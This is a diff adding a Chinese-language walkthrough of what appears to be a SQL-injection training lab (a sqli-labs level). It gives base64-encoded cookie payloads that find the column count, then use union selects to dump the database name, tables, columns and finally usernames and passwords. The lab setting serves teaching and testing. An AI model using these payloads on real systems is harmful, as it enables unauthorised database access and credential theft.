@@ -1,0 +1,29 @@
+Cookie: uname=YWRtaW4=
+同Less-21一样，可以判断对uname进行了Base64编码
+uname=YWRtaW5c        #uname=admin\
+报错
+
+由此推测SQL：
+select 字段名 from 表名 where uname = "输入的uname" limit 0,1;
+uname=YWRtaW4iIC0tIA==        #uname=admin" --
+正常登录，从而印证了推测是正确的
+
+1.字段数
+uname=YWRtaW4iIG9yZGVyIGJ5IDMtLSA=        #uname=admin" order by 3-- 
+正常登录
+uname=YWRtaW4iIG9yZGVyIGJ5IDQtLSA=       #uname=admin" order by 4--
+报错。说明字段数为3
+
+2.数据库名
+uname=MCIgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCBkYXRhYmFzZSgpKSwzLS0g        #uname=0" union select 1,(select database()),3-- 
+
+3.表名
+uname=MCIgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYSA9IGRhdGFiYXNlKCkpLDMtLSA=        #uname=0" union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3-- 
+
+4.字段名
+uname=MCIgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZSA9ICd1c2VycycpLDMtLSA=         #uname=0" union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),3-- 
+
+5.字段值
+uname=MCIgdW5pb24gc2VsZWN0IDEsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUsMHgzYSxwYXNzd29yZCkgZnJvbSB1c2VycyksMy0tIA==        #uname=0" union select 1,(select group_concat(username,0x3a,password) from users),3-- 
+
+
